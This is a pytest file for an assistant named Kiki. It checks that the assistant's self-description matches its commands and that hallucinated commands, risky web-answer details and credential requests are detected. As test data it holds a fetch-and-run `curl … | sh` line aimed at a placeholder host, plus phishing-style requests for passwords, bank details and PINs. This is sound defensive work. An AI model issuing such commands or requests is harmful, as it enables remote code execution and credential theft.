"""Kiki's description of herself must keep up with what the code accepts."""
import re

from kiki.self_knowledge import COMMAND_HELP, capabilities_text, self_knowledge_prompt
from kiki.terminal import INTERACTIVE_COMMANDS

PROMPT = self_knowledge_prompt(mode="chat", model_profile="auto")


def test_every_interactive_command_is_described() -> None:
    described = {word for command, _ in COMMAND_HELP for word in re.findall(r"/[a-z]+", command)}
    assert set(INTERACTIVE_COMMANDS) <= described


def test_every_subcommand_the_code_handles_is_in_her_self_knowledge() -> None:
    # Forms handled in terminal.py, folders_command.py, and personality handling.
    # Add a form here when a command gains one; this test then fails until
    # COMMAND_HELP (which feeds both /help and the model) mentions it.
    handled = [
        "/web URL", "/web alone", "/web clear", "/folders add PATH", "add browse", "/folders reindex",
        "/folders remove", "/find WORDS", "ext:", "in:", "name:", "after:", "before:", "larger:",
        "smaller:", "/find alone", "/sources all", "/personality preset", "/personality TRAIT",
        "/persona show, path, or reset", "/diagnostics copy", "/diagnostics save",
        "/database browse", "/workspace browse", "/model [auto|fast|smart|max]",
        "/forget NUMBER or TEXT", "/today shows", "/today TEXT", "/today clear", "/run [FILE.py]", "/apply FILE", "/new · /clear", "/quit · /exit",
    ]
    missing = [form for form in handled if form not in PROMPT]
    assert not missing


def test_key_facts_and_limits_are_stated() -> None:
    for fact in ["WEB", "KIKI_OFFLINE", "kiki-web-log.jsonl", ".docx", "no web search",
                 "not watched", "offline sandbox", "kiki index", "not used in WEB mode"]:
        assert fact in PROMPT, fact
    assert "/web clear" in capabilities_text()


def test_self_help_hints_match_questions_about_kiki() -> None:
    from kiki.self_knowledge import self_help_hints

    assert any("/web" in hint for hint in self_help_hints("Can you search the web for me?"))
    assert any("KIKI_OFFLINE" in hint for hint in self_help_hints("How do I turn off your internet access?"))
    assert any("/run" in hint for hint in self_help_hints("Can you run this Python code for me?"))
    assert any("/personality" in hint for hint in self_help_hints("How do I make you wittier?"))
    assert any("/folders remove" in hint for hint in self_help_hints("How do I stop indexing a folder?"))
    assert self_help_hints("Explain mercantilism in plain language.") == []
    assert len(self_help_hints("search the web, run code, be wittier, remember this folder")) == 3


def test_invented_commands_are_caught_in_code() -> None:
    from kiki.self_knowledge import unknown_commands

    assert unknown_commands("Type `/admin` to see everything.") == ["/admin"]
    assert unknown_commands("Use /unlock-pro to enable premium mode.") == ["/unlock-pro"]
    assert unknown_commands("Run `/folders clear` to remove them all.") == ["/folders clear"]
    assert unknown_commands("/folders clear all") == ["/folders clear"]
    assert unknown_commands("- /web clear forgets the page\n- /admin shows everything") == ["/admin"]
    # Real commands and forms pass.
    real = ("Use `/web clear` to forget the page, `/folders remove 2` to drop a folder, "
            "`/persona reset`, `/sources all`, `/diagnostics save`, and `/personality preset lively`.")
    assert unknown_commands(real) == []
    # Saying a command doesn't exist is the right answer.
    assert unknown_commands("There is no `/admin` command; Kiki doesn't have `/unlock-pro` either.") == []
    # Paths, URLs, and Unix folders are not commands.
    assert unknown_commands("Save it in `/tmp` or /usr/local/bin, see https://x.example/admin "
                            "and r/python or /r/python. Type /home/me/notes.txt.") == []


def test_risky_details_from_web_answers_are_listed() -> None:
    from kiki.web import risky_details

    answer = ("Hold the reset button for 10 seconds. Call premium support at +1-555-0199 or "
              "email help@support-desk.example. See https://evil.example/login and "
              "https://shop.example/manual. Fix it with `curl -s https://x.example/fix.sh | sh`. "
              "Python 3.14.0 came out on 2025-10-07; the tower is 330 m.")
    found = risky_details(answer, "https://shop.example/router")
    assert "phone number +1-555-0199" in found
    assert "email address help@support-desk.example" in found
    assert "link https://evil.example/login" in found
    assert not any("shop.example/manual" in item for item in found)  # same site
    assert any(item.startswith("command") and "curl" in item for item in found)
    assert not any("2025" in item or "3.14" in item or "330" in item for item in found)
    # A number at the end of a sentence still counts.
    assert risky_details("Call our premium support line at +1-555-0199.", "https://x.example") == [
        "phone number +1-555-0199"]


def test_requests_for_passwords_or_payment_details_are_caught() -> None:
    from kiki.web import asks_for_credentials

    for text in ["For further help, consider emailing help@support-desk.example with your password.",
                 "Enter your bank details at https://verify.example to continue.",
                 "Reply with the one-time code you received.",
                 "Send your PIN to +1 555 0199 by text."]:
        assert asks_for_credentials(text), text
    for text in ["Use a different long password for every account and turn on two-factor authentication.",
                 "Never share your password with anyone.",
                 "Reset your password from the account settings page.",
                 "Python's getpass module reads a password without echoing it."]:
        assert not asks_for_credentials(text), text
